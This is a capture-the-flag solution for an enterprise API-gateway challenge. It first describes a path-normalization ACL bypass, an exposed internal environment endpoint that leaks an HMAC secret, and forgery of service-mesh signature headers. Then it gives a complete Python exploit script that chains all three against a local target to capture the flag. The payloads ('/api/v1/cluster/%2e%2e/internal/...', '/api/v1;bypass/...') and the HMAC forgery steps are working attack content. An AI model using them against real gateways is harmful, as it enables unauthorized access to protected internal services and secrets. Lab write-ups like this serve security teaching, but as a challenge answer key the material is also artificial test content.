# Solution: A02 Hard - Enterprise API Gateway Desync & Service Mesh Signing Forgery

## Overview
This challenge represents an enterprise multi-tier cloud cluster where an edge API Gateway filters external traffic to internal microservices. Due to multiple real-world security misconfigurations (OWASP Top 10:2025 A02), an attacker can bypass gateway ACLs, extract internal service mesh configurations, forge cryptographic HMAC headers, and unlock the master vault.

---

## Vulnerability Analysis
1. **Misconfiguration 1: Gateway Path Normalization Desync (ACL Bypass)**
   - The ingress gateway inspects the unnormalized request URI (`RAW_REQUEST_PATH`) to enforce perimeter ACLs:
     Direct access to `/api/v1/internal/*` returns `403 Forbidden`.
   - However, the backend WSGI framework normalizes matrix parameters (`;`) and encoded path traversal dot-segments (`%2e%2e` / `..%2f`).
   - Requesting `/api/v1/cluster/%2e%2e/internal/env` or `/api/v1;param/internal/env` bypasses the perimeter regex while routing directly to `/api/v1/internal/env`!

2. **Misconfiguration 2: Actuator / Production Environment Exposure**
   - The internal management endpoint `/api/v1/internal/env` is mistakenly active in production.
   - Accessing it reveals the air-gapped vault endpoint (`/api/v1/internal/vault/keys`), its required identity (`cluster_super_admin`), and the shared cryptographic HMAC secret (`rta_mesh_vault_sec_89d3c2b1a0f4e6`).

3. **Misconfiguration 3: Cryptographic Service Mesh Forgery**
   - The air-gapped vault endpoint relies on an HMAC-SHA256 signature header:
     `X-Cluster-Gateway-Signature: HMAC-SHA256(secret, "{timestamp}.GET./api/v1/internal/vault/keys")`
   - By computing the HMAC signature using the leaked secret and supplying `X-Cluster-Identity: cluster_super_admin`, the vault unlocks and returns the dynamic flag.

---

## Automated Exploit Script
```python
import hashlib
import hmac
import time
import requests

TARGET = "http://127.0.0.1:6006"

# Step 1: Bypass Gateway ACL to access unhardened internal environment endpoint
env_url = f"{TARGET}/api/v1/cluster/%2e%2e/internal/env"
print(f"[*] Querying internal cluster environment via: {env_url}")
res = requests.get(env_url)
data = res.json()

vault_info = data["services"]["vault-enclave"]
secret = vault_info["shared_secret"]
endpoint = vault_info["endpoint"]
required_identity = vault_info["required_identity"]

print(f"[+] Leaked Shared Secret: {secret}")
print(f"[+] Vault Endpoint: {endpoint}")
print(f"[+] Required Identity: {required_identity}")

# Step 2: Forge cryptographic service mesh HMAC signature
ts = str(int(time.time()))
msg = f"{ts}.GET.{endpoint}".encode()
sig = hmac.new(secret.encode(), msg, hashlib.sha256).hexdigest()

headers = {
    "X-Cluster-Identity": required_identity,
    "X-Cluster-Timestamp": ts,
    "X-Cluster-Gateway-Signature": sig
}

# Step 3: Access Vault Controller via Gateway ACL bypass
# Insert bypass parameter into the path (/api/v1;bypass/internal/... or /api/v1/cluster/%2e%2e/internal/...)
vault_url = f"{TARGET}{endpoint.replace('/api/v1', '/api/v1;bypass')}"
print(f"[*] Accessing Air-Gapped Vault with forged HMAC signature: {vault_url}")
vault_res = requests.get(vault_url, headers=headers)
print("[+] Response:", vault_res.json())

flag = vault_res.json().get("flag")
print(f"
[!!!] CAPTURED FLAG: {flag}
")
```
